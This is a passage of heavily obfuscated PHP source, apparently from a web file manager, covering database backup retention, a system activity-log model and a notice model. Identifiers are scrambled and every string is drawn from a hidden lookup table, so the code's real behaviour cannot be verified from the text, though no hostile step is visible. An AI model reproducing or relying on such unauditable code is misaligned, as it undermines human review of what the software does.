backupKeep($Æ´áÔ½Ì) { $ÎÈ÷×éõ =& $_SERVER[³à¼î¯á]; if (self::$manual == 1) { return; } $‹ £¼ = Model($ÎÈ÷×éõ[794])->listData(); if (empty($‹ £¼)) { return; } $İşš¢‹Ù = 0; $€ìÒà¬´ = array(); foreach ($‹ £¼ as $÷À°¡´İ) { if ($İşš¢‹Ù >= 7) { break; } $€ìÒà¬´[] = $÷À°¡´İ[$ÎÈ÷×éõ[32]]; $İşš¢‹Ù++; } for ($İşš¢‹Ù = 0; $İşš¢‹Ù < 12; $İşš¢‹Ù++) { $€ìÒà¬´[] = date($ÎÈ÷×éõ[814], strtotime("\55{$İşš¢‹Ù}\x20\155\157\x6e\164\150\163")); } $€ìÒà¬´ = array_unique($€ìÒà¬´); $–Éö™•ù = Model($ÎÈ÷×éõ[815])->get($ÎÈ÷×éõ[816]); foreach ($‹ £¼ as $÷À°¡´İ) { if (isset($÷À°¡´İ[$ÎÈ÷×éõ[800]]) && $÷À°¡´İ[$ÎÈ÷×éõ[800]] == $ÎÈ÷×éõ[91]) { continue; } if (!empty($÷À°¡´İ[$ÎÈ÷×éõ[32]]) && in_array($÷À°¡´İ[$ÎÈ÷×éõ[32]], $€ìÒà¬´)) { continue; } Model($ÎÈ÷×éõ[794])->remove($÷À°¡´İ[$ÎÈ÷×éõ[450]]); $ò™êò¾ = $this->backupPath($Æ´áÔ½Ì, $–Éö™•ù); IO::remove($ò™êò¾, !1); } } private function backupPath($ùÈùËÉõ, $¸­ş½é = false) { $îç’–Ì =& $_SERVER[³à¼î¯á]; if (!$¸­ş½é) { $¸­ş½é = Model($îç’–Ì[815])->get($îç’–Ì[816]); } $üä¯¥÷× = $ùÈùËÉõ[$îç’–Ì[32]]; $õ¦‡¾ĞÕ = substr(md5($îç’–Ì[817] . $¸­ş½é . $üä¯¥÷×), 0, 8); return "\x7b\x69\x6f\72{$ùÈùËÉõ[$îç’–Ì[796]]}\x7d\x2f\144\x61\x74\141\x62\141\163\x65\x2f\x62\x61\x63\x6b\x75\x70\x2f" . $üä¯¥÷× . $îç’–Ì[11] . $õ¦‡¾ĞÕ; } public function db() { $ıñŒÅ¥ı =& $_SERVER[³à¼î¯á]; $©²’É• = self::get(); if ($©²’É•[$ıñŒÅ¥ı[344]][$ıñŒÅ¥ı[802]][$ıñŒÅ¥ı[795]] == $ıñŒÅ¥ı[91]) { return !0; } $ì•à˜ùß = new BackupDb(); if (!$ì•à˜ùß->index()) { return !1; } self::set(array($ıñŒÅ¥ı[818] => 1)); return !0; } public function dbFile() { $´Â®Ûœæ =& $_SERVER[³à¼î¯á]; $—ªşÈâæ = self::get(); if ($—ªşÈâæ[$´Â®Ûœæ[344]][$´Â®Ûœæ[807]][$´Â®Ûœæ[795]] == $´Â®Ûœæ[91]) { return !0; } $Õßô™Ë = new BackupDbFile(); if (!$Õßô™Ë->index()) { return !1; } self::set(array($´Â®Ûœæ[819] => 1)); return !0; } public function file() { $´¸á³Î =& $_SERVER[³à¼î¯á]; $Ú£åéõ– = self::get(); if ($Ú£åéõ–[$´¸á³Î[344]][$´¸á³Î[221]][$´¸á³Î[795]] == $´¸á³Î[91]) { return !0; } if (!isset($Ú£åéõ–[$´¸á³Î[799]]) || $Ú£åéõ–[$´¸á³Î[799]] == $´¸á³Î[219]) { $Â½Çò´¡ = new BackupFile(); if (!$Â½Çò´¡->index()) { return !1; } } self::set(array($´¸á³Î[820] => 1, $´¸á³Î[795] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¥¿–É =& $_SERVER[³à¼î¯á]; $Ö¥ÈœÍÂ = Backup::get(); self::$io = $Ö¥ÈœÍÂ[$¥¿–É[796]]; self::$name = $Ö¥ÈœÍÂ[$¥¿–É[32]]; $°—à÷ïµ = new DbManage(); $Á„Â›±ƒ = $°—à÷ïµ->dbType(); $Ú¡‰ŒÃ = array($¥¿–É[821] => $Á„Â›±ƒ, $¥¿–É[822] => time()); Backup::set($Ú¡‰ŒÃ); $Ãú§¨²¸ = $this->tmpFilesPath() . $¥¿–É[823] . self::$name . $¥¿–É[8]; del_dir($Ãú§¨²¸); mk_dir($Ãú§¨²¸); $ÁœÍÂ‘± = $èÜıŞáº = 0; try { $î»¼¡ªË = $°—à÷ïµ->db()->getTables(); } catch (Exception $ÇÅšşº) { return !1; } $î»¼¡ªË = array_diff($î»¼¡ªË, array($¥¿–É[824], $¥¿–É[825])); foreach ($î»¼¡ªË as $»·ˆ›êˆ) { $ÁœÍÂ‘± += $°—à÷ïµ->model($»·ˆ›êˆ)->count(); } $²§ó æÇ = new Task($¥¿–É[826], $¥¿–É[827], $ÁœÍÂ‘±, LNG($¥¿–É[828]) . $¥¿–É[829] . LNG($¥¿–É[830])); $GLOBALS[$¥¿–É[831]] = self::$name; foreach ($î»¼¡ªË as $»·ˆ›êˆ) { $×€Ğí×Ï = $Ãú§¨²¸ . $»·ˆ›êˆ . $¥¿–É[832]; $Øø±£ = null; if ($»·ˆ›êˆ == $¥¿–É[833] && (!isset($Ö¥ÈœÍÂ[$¥¿–É[799]]) || $Ö¥ÈœÍÂ[$¥¿–É[799]] == $¥¿–É[219])) { $Øø±£ = self::$io; } $èÜıŞáº += $°—à÷ïµ->sqlFromDb($»·ˆ›êˆ, $×€Ğí×Ï, $²§ó æÇ, $Øø±£); } unset($GLOBALS[$¥¿–É[831]]); $²§ó æÇ->end(); if ($èÜıŞáº > $ÁœÍÂ‘±) { $ÁœÍÂ‘± = $èÜıŞáº; } $Ú¡‰ŒÃ = array($¥¿–É[821] => $Á„Â›±ƒ, $¥¿–É[818] => 1, $¥¿–É[834] => $ÁœÍÂ‘±, $¥¿–É[835] => $èÜıŞáº, $¥¿–É[836] => time()); Backup::set($Ú¡‰ŒÃ); if ($ÁœÍÂ‘± - $èÜıŞáº > 0) { $¡Ğïš†¾ = $¥¿–É[837]; if (!stristr(I18n::getType(), $¥¿–É[838])) { $¡Ğïš†¾ = $¥¿–É[839]; } write_log(array($¡Ğïš†¾, $Ú¡‰ŒÃ), $¥¿–É[827]); return !1; } return !0; } private function tmpFilesPath() { $ôäë¥’‰ =& $_SERVER[³à¼î¯á]; $’‰Ì˜–É = TEMP_FILES; if ($GLOBALS[$ôäë¥’‰[6]][$ôäë¥’‰[92]][$ôäë¥’‰[840]]) { $’‰Ì˜–É = $GLOBALS[$ôäë¥’‰[6]][$ôäë¥’‰[92]][$ôäë¥’‰[840]]; if (!mk_dir($’‰Ì˜–É) || !is_writable($’‰Ì˜–É) || !IO::mkfile($’‰Ì˜–É . $ôäë¥’‰[841])) { $’‰Ì˜–É = TEMP_FILES; } } return $’‰Ì˜–É; } } goto CšİÑø‡†‚; aƒ½¹ÄÉ¯å: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\x66\x75\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $á„•¹¤½ =& $_SERVER[³à¼î¯á]; return array($á„•¹¤½[2315] => LNG($á„•¹¤½[2316]), $á„•¹¤½[2317] => LNG($á„•¹¤½[2318]), $á„•¹¤½[1895] => LNG($á„•¹¤½[2319]), $á„•¹¤½[2320] => LNG($á„•¹¤½[2321]), $á„•¹¤½[2322] => LNG($á„•¹¤½[2323]), $á„•¹¤½[2324] => LNG($á„•¹¤½[2325]), $á„•¹¤½[2326] => LNG($á„•¹¤½[2327]), $á„•¹¤½[1925] => LNG($á„•¹¤½[2327]), $á„•¹¤½[1926] => LNG($á„•¹¤½[2328]), $á„•¹¤½[2329] => LNG($á„•¹¤½[2330]), $á„•¹¤½[2331] => LNG($á„•¹¤½[2332]), $á„•¹¤½[2333] => LNG($á„•¹¤½[2334]), $á„•¹¤½[2335] => LNG($á„•¹¤½[2336]), $á„•¹¤½[1923] => LNG($á„•¹¤½[2337]), $á„•¹¤½[2338] => LNG($á„•¹¤½[2339]), $á„•¹¤½[1930] => LNG($á„•¹¤½[2340]), $á„•¹¤½[2341] => LNG($á„•¹¤½[2342]), $á„•¹¤½[2343] => LNG($á„•¹¤½[2344]), $á„•¹¤½[2345] => LNG($á„•¹¤½[2346]), $á„•¹¤½[2347] => LNG($á„•¹¤½[2348]), $á„•¹¤½[1933] => LNG($á„•¹¤½[2349]), $á„•¹¤½[1934] => LNG($á„•¹¤½[2350]), $á„•¹¤½[2351] => LNG($á„•¹¤½[2352]), $á„•¹¤½[2353] => LNG($á„•¹¤½[2354]), $á„•¹¤½[2355] => LNG($á„•¹¤½[2356]), $á„•¹¤½[1928] => LNG($á„•¹¤½[2357]), $á„•¹¤½[2358] => LNG($á„•¹¤½[2359]), $á„•¹¤½[1927] => LNG($á„•¹¤½[2360]), $á„•¹¤½[2361] => LNG($á„•¹¤½[2362]), $á„•¹¤½[2363] => LNG($á„•¹¤½[2364]), $á„•¹¤½[2365] => LNG($á„•¹¤½[2364]), $á„•¹¤½[2366] => LNG($á„•¹¤½[2367]), $á„•¹¤½[2368] => LNG($á„•¹¤½[2368]), $á„•¹¤½[2369] => LNG($á„•¹¤½[1899]), $á„•¹¤½[2370] => LNG($á„•¹¤½[2371]), $á„•¹¤½[2372] => LNG($á„•¹¤½[2373]), $á„•¹¤½[2374] => LNG($á„•¹¤½[2375]), $á„•¹¤½[2376] => LNG($á„•¹¤½[2377]), $á„•¹¤½[2378] => LNG($á„•¹¤½[2379]), $á„•¹¤½[2380] => LNG($á„•¹¤½[2380]), $á„•¹¤½[2381] => LNG($á„•¹¤½[2382]), $á„•¹¤½[2383] => LNG($á„•¹¤½[2384]), $á„•¹¤½[2385] => LNG($á„•¹¤½[2386]), $á„•¹¤½[2387] => LNG($á„•¹¤½[2388]), $á„•¹¤½[2389] => LNG($á„•¹¤½[2390]), $á„•¹¤½[2391] => LNG($á„•¹¤½[2392]), $á„•¹¤½[203] => LNG($á„•¹¤½[203]), $á„•¹¤½[204] => LNG($á„•¹¤½[2393]), $á„•¹¤½[2394] => LNG($á„•¹¤½[2394])); } private function typeFile() { $®¶ÕŞŸ =& $_SERVER[³à¼î¯á]; $ç»–ÇÙÕ = array($®¶ÕŞŸ[1930] => array($®¶ÕŞŸ[1931]), $®¶ÕŞŸ[2333] => array($®¶ÕŞŸ[2395]), $®¶ÕŞŸ[2335] => array($®¶ÕŞŸ[2396]), $®¶ÕŞŸ[1923] => array($®¶ÕŞŸ[1924], $®¶ÕŞŸ[2397]), $®¶ÕŞŸ[2343] => array(), $®¶ÕŞŸ[2345] => array(), $®¶ÕŞŸ[2347] => array(), $®¶ÕŞŸ[1933] => array($®¶ÕŞŸ[1935]), $®¶ÕŞŸ[1934] => array($®¶ÕŞŸ[1935]), $®¶ÕŞŸ[2351] => array($®¶ÕŞŸ[2398]), $®¶ÕŞŸ[2353] => array($®¶ÕŞŸ[2398]), $®¶ÕŞŸ[2355] => array($®¶ÕŞŸ[2399]), $®¶ÕŞŸ[2341] => array($®¶ÕŞŸ[2400]), $®¶ÕŞŸ[1928] => array($®¶ÕŞŸ[2401]), $®¶ÕŞŸ[2358] => array($®¶ÕŞŸ[2402]), $®¶ÕŞŸ[1927] => array($®¶ÕŞŸ[1929])); return $ç»–ÇÙÕ; } private function typeAll() { $ÏâÎû»Ç =& $_SERVER[³à¼î¯á]; $¦œ’»û = $this->typeList; $ÑÂœûüÉ = array_filter($this->typeFile()); foreach ($ÑÂœûüÉ as $³½ÜÄÖ => $ÁÁ”°„ò) { $¦œ’»û[$ÁÁ”°„ò[0]] = $¦œ’»û[$³½ÜÄÖ]; } $¦œ’»û[$ÏâÎû»Ç[1935]] = LNG($ÏâÎû»Ç[2403]); $¦œ’»û[$ÏâÎû»Ç[2398]] = LNG($ÏâÎû»Ç[2404]); return $¦œ’»û; } public function addLog($şœ¦ÆÇÌ, $Ü¸ï¼×¿ = array()) { $¬î âû =& $_SERVER[³à¼î¯á]; if (!isset($this->typeList[$şœ¦ÆÇÌ])) { return; } $û»‚ºèá = Session::get($¬î âû[2094]); if (!$û»‚ºèá) { $û»‚ºèá = _get($Ü¸ï¼×¿, $¬î âû[1753], 0); } if ($şœ¦ÆÇÌ == $¬î âû[2370] && is_array($Ü¸ï¼×¿[$¬î âû[2405]]) && !$Ü¸ï¼×¿[$¬î âû[2405]]) { return; } $„¿ºî = get_client_ip(); if (!$Ü¸ï¼×¿ || strlen(json_encode($Ü¸ï¼×¿)) >= 1024 * 64) { if ($Ü¸ï¼×¿ && is_array($Ü¸ï¼×¿)) { $Ü¸ï¼×¿ = array_intersect_key($Ü¸ï¼×¿, array_flip($¬î âû[450], $¬î âû[32])); $Ü¸ï¼×¿[$¬î âû[2406]] = $„¿ºî; } else { $Ü¸ï¼×¿ = array($¬î âû[2406] => $„¿ºî); } } else { if (is_array($Ü¸ï¼×¿)) { $Ü¸ï¼×¿[$¬î âû[2406]] = $„¿ºî; } else { $Ü¸ï¼×¿ = array($¬î âû[1256] => $Ü¸ï¼×¿, $¬î âû[2406] => $„¿ºî); } } $Ü¸ï¼×¿ = array($¬î âû[1743] => Session::sign(), $¬î âû[1744] => intval($û»‚ºèá), $¬î âû[33] => $şœ¦ÆÇÌ, $¬î âû[1746] => json_encode($Ü¸ï¼×¿)); parent::add($Ü¸ï¼×¿); } public function remove($ô–î¨èì) { $this->where(array($_SERVER[³à¼î¯á][468] => $ô–î¨èì))->delete(); } private function _makeOrder($¼ã÷áÆó = '') { $áËÙñî =& $_SERVER[³à¼î¯á]; $ú¹ÍôãÅ = $áËÙñî[222]; $Œûúö°‘ = array($áËÙñî[498] => $áËÙñî[499], $áËÙñî[500] => $áËÙñî[501]); $æççÕ = Input::get($áËÙñî[506], $áËÙñî[7], $áËÙñî[2130], array($áËÙñî[2048], $áËÙñî[500])); $æççÕ = $Œûúö°‘[$æççÕ]; $¼ã÷áÆó = $¼ã÷áÆó . "{$ú¹ÍôãÅ}\40{$æççÕ}"; return $this->order($¼ã÷áÆó); } public function get($Ñ¾±ĞÃè = '') { $•ÒîòÃ =& $_SERVER[³à¼î¯á]; if (!$Ñ¾±ĞÃè) { show_json(array()); } $ÈùÚ¥”Û = array(); if ($Ñ¾±ĞÃè[$•ÒîòÃ[1753]]) { $ÈùÚ¥”Û[$•ÒîòÃ[1753]] = $Ñ¾±ĞÃè[$•ÒîòÃ[1753]]; } if (isset($Ñ¾±ĞÃè[$•ÒîòÃ[805]])) { $ÖÊ¦ùª = $Ñ¾±ĞÃè[$•ÒîòÃ[805]]; $×Ï¡Æ£Ê = isset($Ñ¾±ĞÃè[$•ÒîòÃ[806]]) ? $Ñ¾±ĞÃè[$•ÒîòÃ[806]] : time(); $ÈùÚ¥”Û[$•ÒîòÃ[222]] = array($•ÒîòÃ[384], array($ÖÊ¦ùª, $×Ï¡Æ£Ê)); } if ($Ñ¾±ĞÃè[$•ÒîòÃ[33]]) { $æ²¯¡ãÁ = explode($•ÒîòÃ[50], $Ñ¾±ĞÃè[$•ÒîòÃ[33]]); $äÁøºÎœ = $this->typeFile(); $¦šüî«ù = array(); foreach ($æ²¯¡ãÁ as $ŠÔ¦Ğà®) { $¦šüî«ù[] = $ŠÔ¦Ğà®; if (isset($äÁøºÎœ[$ŠÔ¦Ğà®])) { $¦šüî«ù = array_merge($¦šüî«ù, $äÁøºÎœ[$ŠÔ¦Ğà®]); } } $¦šüî«ù = array_unique($¦šüî«ù); if ($¦šüî«ù) { $ÈùÚ¥”Û[$•ÒîòÃ[33]] = array($•ÒîòÃ[7], $¦šüî«ù); } } else { $ÈùÚ¥”Û[$•ÒîòÃ[33]] = array($•ÒîòÃ[2407], $•ÒîòÃ[2408]); } if (!empty($Ñ¾±ĞÃè[$•ÒîòÃ[2406]])) { $ÈùÚ¥”Û[$•ÒîòÃ[501]] = array($•ÒîòÃ[434], "\x25{$Ñ¾±ĞÃè[$•ÒîòÃ[2406]]}\45"); } $¤³ÜÍİ = $this->_makeOrder()->where($ÈùÚ¥”Û)->selectPage(); if (empty($¤³ÜÍİ[$•ÒîòÃ[420]])) { show_json(array(), !0, $¤³ÜÍİ[$•ÒîòÃ[417]]); } $¤³ÜÍİ[$•ÒîòÃ[420]] = $this->logList($¤³ÜÍİ[$•ÒîòÃ[420]]); return $¤³ÜÍİ; } private function ipAddress(&$ùÍ£–Ê¬) { $—ßƒòİ =& $_SERVER[³à¼î¯á]; if (!empty($ùÍ£–Ê¬[$—ßƒòİ[2406]])) { $ÒóÄä¶ = IpLocation::get($ùÍ£–Ê¬[$—ßƒòİ[2406]]); } else { $ÒóÄä¶ = LNG($—ßƒòİ[2409]); } $ùÍ£–Ê¬[$—ßƒòİ[2410]] = $ÒóÄä¶; } private function descZipDownload($ÉÍå€àì, &$‘²‰µÚà) { $ÕıöêÛĞ =& $_SERVER[³à¼î¯á]; if (!isset($ÉÍå€àì[$ÕıöêÛĞ[2411]])) { return; } $Øˆ¥€…Ñ = json_decode($ÉÍå€àì[$ÕıöêÛĞ[2411]], !0); foreach ($Øˆ¥€…Ñ as $Æ­É´) { try { $Î¤ÚüÁ = IO::infoFullSimple($Æ­É´[$ÕıöêÛĞ[87]]); } catch (Exception $Ë¯¡½¾) { continue; } $ÉÍå€àì[$ÕıöêÛĞ[87]] = $Æ­É´[$ÕıöêÛĞ[87]]; $‘²‰µÚà[] = $ÉÍå€àì[$ÕıöêÛĞ[184]] = $Î¤ÚüÁ[$ÕıöêÛĞ[184]]; $‘²‰µÚà[] = $ÉÍå€àì[$ÕıöêÛĞ[2186]] = $Î¤ÚüÁ[$ÕıöêÛĞ[183]]; break; } return $ÉÍå€àì; } private function getSourceList(&$¥ù±Å) { $ƒ©Î“€© =& $_SERVER[³à¼î¯á]; $ÌÄç×İİ = array(); foreach ($¥ù±Å as $ˆ’á¿ü© => $›çû‘şâ) { $Æèû£á¦ = json_decode($›çû‘şâ[$ƒ©Î“€©[501]], !0); if ($›çû‘şâ[$ƒ©Î“€©[33]] == $ƒ©Î“€©[1926]) { $Æèû£á¦ = $this->descZipDownload($Æèû£á¦, $ÌÄç×İİ); $¥ù±Å[$ˆ’á¿ü©][$ƒ©Î“€©[501]] = json_encode($Æèû£á¦); continue; } if (strpos($›çû‘şâ[$ƒ©Î“€©[33]], $ƒ©Î“€©[2188]) !== 0) { if (!isset($Æèû£á¦[$ƒ©Î“€©[87]]) || strpos($›çû‘şâ[$ƒ©Î“€©[33]], $ƒ©Î“€©[2412]) !== 0) { continue; } try { $¬ßõ»»Ê = IO::infoFullSimple($Æèû£á¦[$ƒ©Î“€©[87]]); } catch (Exception $—©À´£É) { continue; } $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[184]] = $¬ßõ»»Ê[$ƒ©Î“€©[184]]; $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[2186]] = $¬ßõ»»Ê[$ƒ©Î“€©[183]]; $¥ù±Å[$ˆ’á¿ü©][$ƒ©Î“€©[501]] = json_encode($Æèû£á¦); continue; } $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[184]]; $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[2186]]; if ($Æèû£á¦[$ƒ©Î“€©[33]] == $ƒ©Î“€©[595]) { $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[501]][$ƒ©Î“€©[1213]]; $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[501]][$ƒ©Î“€©[1214]]; } if ($Æèû£á¦[$ƒ©Î“€©[33]] == $ƒ©Î“€©[2197]) { $ÌÄç×İİ[] = $Æèû£á¦[$ƒ©Î“€©[501]][$ƒ©Î“€©[184]]; } } if (!$ÌÄç×İİ) { return array(); } return Model($ƒ©Î“€©[869])->sourceListInfo($ÌÄç×İİ, !0); } private function logList($¶Õİ×‘ï) { $Ğí¯¡ŠÈ =& $_SERVER[³à¼î¯á]; $êÓ·ô¸½ = array_to_keyvalue($¶Õİ×‘ï, $Ğí¯¡ŠÈ[12], $Ğí¯¡ŠÈ[1753]); $áèÒ = Model($Ğí¯¡ŠÈ[574])->userListInfo(array_unique($êÓ·ô¸½)); $íë„’’¿ = $this->getSourceList($¶Õİ×‘ï); $î¦åùË¹ = $this->typeAll(); $€ı¿óòú = array(); $ï“Ã©ºØ = array(); foreach ($¶Õİ×‘ï as $ÈÑÛ¢âú => $‡›”Ä¥) { $›ªŠ°ˆ = $‡›”Ä¥[$Ğí¯¡ŠÈ[33]]; $Ê€«Õ = isset($áèÒ[$‡›”Ä¥[$Ğí¯¡ŠÈ[1753]]]) ? $áèÒ[$‡›”Ä¥[$Ğí¯¡ŠÈ[1753]]] : !1; $ÀÍÙöÒ = strpos($›ªŠ°ˆ, $Ğí¯¡ŠÈ[2413]) === 0 ? LNG($Ğí¯¡ŠÈ[2414]) : LNG($Ğí¯¡ŠÈ[2409]); $‡›”Ä¥[$Ğí¯¡ŠÈ[32]] = isset($Ê€«Õ[$Ğí¯¡ŠÈ[32]]) ? $Ê€«Õ[$Ğí¯¡ŠÈ[32]] : LNG($Ğí¯¡ŠÈ[2409]); $‡›”Ä¥[$Ğí¯¡ŠÈ[2241]] = isset($Ê€«Õ[$Ğí¯¡ŠÈ[2241]]) ? $Ê€«Õ[$Ğí¯¡ŠÈ[2241]] : $Ğí¯¡ŠÈ[12]; $‡›”Ä¥[$Ğí¯¡ŠÈ[1643]] = isset($î¦åùË¹[$›ªŠ°ˆ]) ? $î¦åùË¹[$›ªŠ°ˆ] : $ÀÍÙöÒ; $‡›”Ä¥[$Ğí¯¡ŠÈ[2129]] = $Ê€«Õ; $©Ùû®«ø = json_decode($‡›”Ä¥[$Ğí¯¡ŠÈ[501]], !0); $‡›”Ä¥[$Ğí¯¡ŠÈ[2406]] = isset($©Ùû®«ø[$Ğí¯¡ŠÈ[2406]]) ? $©Ùû®«ø[$Ğí¯¡ŠÈ[2406]] : $Ğí¯¡ŠÈ[12]; $‡›”Ä¥[$Ğí¯¡ŠÈ[2410]] = IpLocation::get($‡›”Ä¥[$Ğí¯¡ŠÈ[2406]]); if (strpos($›ªŠ°ˆ, $Ğí¯¡ŠÈ[2188]) === 0 || isset($©Ùû®«ø[$Ğí¯¡ŠÈ[2186]])) { $©Ùû®«ø[$Ğí¯¡ŠÈ[90]] = $íë„’’¿[$©Ùû®«ø[$Ğí¯¡ŠÈ[184]]]; $©Ùû®«ø[$Ğí¯¡ŠÈ[2202]] = $íë„’’¿[$©Ùû®«ø[$Ğí¯¡ŠÈ[2186]]]; if ($©Ùû®«ø[$Ğí¯¡ŠÈ[33]] == $Ğí¯¡ŠÈ[595]) { $©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[1213]] = $íë„’’¿[$©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[1213]]]; $©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[1214]] = $íë„’’¿[$©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[1214]]]; } if ($©Ùû®«ø[$Ğí¯¡ŠÈ[33]] == $Ğí¯¡ŠÈ[2197]) { $©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[184]] = $íë„’’¿[$©Ùû®«ø[$Ğí¯¡ŠÈ[501]][$Ğí¯¡ŠÈ[184]]]; } if ($©Ùû®«ø[$Ğí¯¡ŠÈ[33]] == $Ğí¯¡ŠÈ[1921]) { $©Ùû®«ø[$Ğí¯¡ŠÈ[2202]] = $©Ùû®«ø[$Ğí¯¡ŠÈ[90]]; $©Ùû®«ø[$Ğí¯¡ŠÈ[2186]] = $©Ùû®«ø[$Ğí¯¡ŠÈ[2202]][$Ğí¯¡ŠÈ[184]]; $©Ùû®«ø[$Ğí¯¡ŠÈ[90]] = !1; $©Ùû®«ø[$Ğí¯¡ŠÈ[184]] = $Ğí¯¡ŠÈ[12]; } $€ÂÁö˜æ = array($Ğí¯¡ŠÈ[1921], $Ğí¯¡ŠÈ[2184]); if (!in_array($©Ùû®«ø[$Ğí¯¡ŠÈ[33]], $€ÂÁö˜æ)) { if ($©Ùû®«ø[$Ğí¯¡ŠÈ[90]] && $©Ùû®«ø[$Ğí¯¡ŠÈ[90]][$Ğí¯¡ŠÈ[181]] == $Ğí¯¡ŠÈ[182]) { $ï“Ã©ºØ[] = $‡›”Ä¥[$Ğí¯¡ŠÈ[450]]; unset($¶Õİ×‘ï[$ÈÑÛ¢âú]); continue; } if ($©Ùû®«ø[$Ğí¯¡ŠÈ[2202]] && $©Ùû®«ø[$Ğí¯¡ŠÈ[2202]][$Ğí¯¡ŠÈ[181]] == $Ğí¯¡ŠÈ[182]) { $ï“Ã©ºØ[] = $‡›”Ä¥[$Ğí¯¡ŠÈ[450]]; unset($¶Õİ×‘ï[$ÈÑÛ¢âú]); continue; } } } $‡›”Ä¥[$Ğí¯¡ŠÈ[501]] = $©Ùû®«ø; unset($‡›”Ä¥[$Ğí¯¡ŠÈ[2415]]); $€ı¿óòú[] = $‡›”Ä¥; } $this->clearSystemPathLog($ï“Ã©ºØ); return $€ı¿óòú; } private function clearSystemPathLog($ê€¶›Åä) { $´Ø‘†ÙŠ =& $_SERVER[³à¼î¯á]; if (count($ê€¶›Åä) == 0) { return; } $úÆöåµ = array($´Ø‘†ÙŠ[450] => array($´Ø‘†ÙŠ[7], array_unique($ê€¶›Åä))); $this->where($úÆöåµ)->delete(); } public function deviceList($ÓÚÌÅ¸ğ, $›¡ÇŒ›­ = 0) { $ÓıŠğÌÕ =& $_SERVER[³à¼î¯á]; $¼‘ÓÇ‡ö = array($ÓıŠğÌÕ[1753] => $ÓÚÌÅ¸ğ, $ÓıŠğÌÕ[222] => array($ÓıŠğÌÕ[1064], $›¡ÇŒ›­), $ÓıŠğÌÕ[33] => $ÓıŠğÌÕ[1895]); $şöâ°œ = array(); $Â£™ìÓ» = $this->field($ÓıŠğÌÕ[2416])->where($¼‘ÓÇ‡ö)->order($ÓıŠğÌÕ[2200])->limit(50)->select(); foreach ($Â£™ìÓ» as $ÑæùÖ™ => $–¸Ñƒı¹) { if ($ÑæùÖ™ > 0 && abs($–¸Ñƒı¹[$ÓıŠğÌÕ[222]] - $Â£™ìÓ»[$ÑæùÖ™ - 1][$ÓıŠğÌÕ[222]]) < 5) { continue; } $Â£ó€é = json_decode($–¸Ñƒı¹[$ÓıŠğÌÕ[501]], !0); $–¸Ñƒı¹[$ÓıŠğÌÕ[2406]] = isset($Â£ó€é[$ÓıŠğÌÕ[2406]]) ? $Â£ó€é[$ÓıŠğÌÕ[2406]] : $ÓıŠğÌÕ[12]; unset($Â£ó€é[$ÓıŠğÌÕ[2406]]); $¥ÏªÇÈÇ = $this->deviceType($Â£ó€é[$ÓıŠğÌÕ[2189]]); if (isset($şöâ°œ[$¥ÏªÇÈÇ])) { continue; } $–¸Ñƒı¹[$ÓıŠğÌÕ[2410]] = IpLocation::get($–¸Ñƒı¹[$ÓıŠğÌÕ[2406]]); $–¸Ñƒı¹[$ÓıŠğÌÕ[501]] = $Â£ó€é; $şöâ°œ[$¥ÏªÇÈÇ] = $–¸Ñƒı¹; } return array_values($şöâ°œ); } public function deviceType($‚Ù³×·˜) { return $‚Ù³×·˜; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\156\x6f\164\x69\143\x65\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x63\157\x6e\x74\145\x6e\164", "\x61\165\x74\x68", "\155\157\x64\145", "\164\x69\155\145", "\x74\171\x70\145", "\x6c\x65\x76\x65\x6c", "\x65\x6e\x61\x62\x6c\145", "\163\157\162\x74"); public function listData($Ô¨ ’¶ì = false, $İ¯öŒ°õ = "\x73\x6f\x72\x74", $¼Á» ×À = false) { return parent::listData($Ô¨ ’¶ì, $İ¯öŒ°õ, $¼Á» ×À); } public function add($¶÷ìÙ„×) { $¨õÌè¸ =& $_SERVER[³à¼î¯á]; $á…¬éã½ = time(); if ($¶÷ìÙ„×[$¨õÌè¸[16]] == $¨õÌè¸[2417]) { $á…¬éã½ = strtotime($¶÷ìÙ„×[$¨õÌè¸[197]]); } $¶÷ìÙ„×[$¨õÌè¸[197]] = $á…¬éã½; return parent::insert($¶÷ìÙ„×); } public function update($›×şà„Ğ, $×‰Â„¦ñ) { $¸¿ƒ”Ó° =& $_SERVER[³à¼î¯á]; $øøöş®… = $this->listData($›×şà„Ğ); if (!$øøöş®…) { return !1; } $ø¾ˆ‰œÉ = time(); if ($×‰Â„¦ñ[$¸¿ƒ”Ó°[16]] == $¸¿ƒ”Ó°[2417]) { $ø¾ˆ‰œÉ = strtotime($×‰Â„¦ñ[$¸¿ƒ”Ó°[197]]); } $×‰Â„¦ñ[$¸¿ƒ”Ó°[197]] = $ø¾ˆ‰œÉ; return parent::update($›×şà„Ğ, $×‰Â„¦ñ); } public function remove($–÷üª£ô) { $òÇ¸ã® = $this->listData($–÷üª£ô); if (!$òÇ¸ã® || $òÇ¸ã®[$_SERVER[³à¼î¯á][182]]) { return !1; } return parent::remove($–÷üª£ô); } public function sort($î«‘ñİ, $¬ÖßÓ«ƒ) { return parent::update($î«‘ñİ, $¬ÖßÓ«ƒ); } public function enable($š·Ï‡ì, $İ†‰áÀ˜) { return parent::update($š·Ï‡ì, array($_SERVER[³à¼î¯á][2418] => $İ†‰áÀ˜)); } private function initUserOption() { $ Í›¹Â£ =& $_SERVER[³à¼î¯á]; $this->optionType = $ Í›¹Â£[2419]; $this->modelType = $ 